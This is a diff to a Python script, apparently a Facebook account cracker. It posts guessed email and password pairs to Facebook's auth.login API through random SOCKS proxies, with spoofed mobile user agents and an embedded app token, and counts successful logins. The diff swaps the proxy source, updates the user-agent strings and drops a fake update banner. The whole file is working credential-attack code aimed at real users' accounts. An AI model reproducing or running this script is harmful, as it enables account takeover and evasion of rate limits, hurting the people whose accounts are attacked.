@@ -1,15 +1,6 @@
 import os
 import time
 os.system('clear')
-print('\033[1;32mInstaling missing modules.............\033[1;37m');time.sleep(3)
-os.system('clear')
-#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('clear')
-print('\033[1;32mGetting server response............\033[1;37m');time.sleep(3)
-os.system('clear')
-print('\033[1;32mDownloading Update.............\033[1;37m');time.sleep(3)
-os.system('git pull')
-os.system('clear')
 from os import system as clr
 import random
 import string 
@@ -39,7 +30,7 @@ oks=[]
 cps=[]
 loop=0
 try:
-  proxylist= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
+  proxylist= requests.get('https://raw.githubusercontent.com/Peaky-XD/proxy/main/socks4.txt').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -150,20 +141,17 @@ def method_crack(ids,passlist):
             sys.stdout.write('\r\r \033[1;37mCracking.. %s|M1|\033[1;32mOK:%s'%(loop,len(oks)))
             sys.stdout.flush()
             nip=random.choice(proxsi)
-            proxs= {'http': 'socks5://'+nip}
+            proxs= {'http': 'socks4://'+nip}
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             bld=random.choice([178366431,676379710])
-            build=random.choice(['[FBAN/FB4A;FBAV/38.0.0.3957;FBBV/2605657;[FBAN/FB4A;FBAV/301.0.0.7.106;FBBV/813628060;FBDM/{density=2.4,width=1080,height=1435};FBLC/id_ID;FBRV/428002359;FBCR/Jio 4G;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/393.0.0.8.184;FBBV/140350243;FBDM/{density=3.2,width=1080,height=1402};FBLC/he_IL;FBRV/174394110;FBCR/Banglalink;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A9100;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/65.0.0.4035;FBBV/7239343;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-W750V;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]','[FBAN/FB4A;FBAV/423.0.0.21.64;FBCR/Teletalk;FBBV/343761542;FBPN/com.facebook.liteh;FBMF/vivo;FBLC/en_US;FBDV/vivo 1811;FBBD/vivo;FBSV/8;FBOP/1;FBRV/0;FBCA/armeabi-v7a:armeabi;]'])
-            ##uaz=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(6,13))}; SM-R865U Build/{str(build)}.{str(bld)}) [FBAN/FB4A;FBAV/128.0.0.27.207;FBBV/31426589;FBDM/'+'{density=1.5,width=1280,height=1920}'+';FBLC/en_US;FBCR/ Com Hem;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-R865U;FBSV/10.0.5;nullFBCA/armeabi-v7a:armeabi;]'
+            build=random.choice(['[FBAN/FB4A;FBAV/671.0.0.60854;FBBV/632070565;[FBAN/FB4A;FBAV/217.0.0.19.67;FBPN/com.facebook.katana;FBLC/en_YE;FBBV/923262613;FBCR/PalauCel;FBMF/Niu;FBBD/NIU;FBDV/Andy C5.5E2I;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]','[FBAN/FB4A;FBAV/718.0.0.98561;FBBV/160044751;[FBAN/FB4A;FBAV/217.0.0.19.67;FBPN/com.facebook.katana;FBLC/en_BH;FBBV/923262613;FBCR/SUN Mobile;FBMF/Niu;FBBD/NIU;FBDV/Andy C5.5E2I;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]','[FBAN/FB4A;FBAV/582.0.0.21564;FBBV/520422992;[FBAN/FB4A;FBAV/217.0.0.19.67;FBPN/com.facebook.katana;FBLC/en_AO;FBBV/923262613;FBCR/Vodefone US;FBMF/Niu;FBBD/NIU;FBDV/Andy C5.5E2I;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]','[FBAN/FB4A;FBAV/38.0.0.3957;FBBV/2605657;[FBAN/FB4A;FBAV/301.0.0.7.106;FBBV/813628060;FBDM/{density=2.4,width=1080,height=1435};FBLC/id_ID;FBRV/428002359;FBCR/Jio 4G;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/393.0.0.8.184;FBBV/140350243;FBDM/{density=3.2,width=1080,height=1402};FBLC/he_IL;FBRV/174394110;FBCR/Banglalink;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A9100;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/65.0.0.4035;FBBV/7239343;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-W750V;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]','[FBAN/FB4A;FBAV/423.0.0.21.64;FBCR/Teletalk;FBBV/343761542;FBPN/com.facebook.liteh;FBMF/vivo;FBLC/en_US;FBDV/vivo 1811;FBBD/vivo;FBSV/8;FBOP/1;FBRV/0;FBCA/armeabi-v7a:armeabi;]'])
             datax={'adid': adid, 'format': 'json', 'device_id': adid, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
-            sex={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': uaz, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            sex={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': build, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
             sex1={'User-Agent': build, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '333'}
             header=random.choice([sex,sex1])
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
-            #############################print(url,data,headers,proxies)
-            #print(response)
             if 'session_key' in reqx:
                 try:
                     uid=reqx['uid']
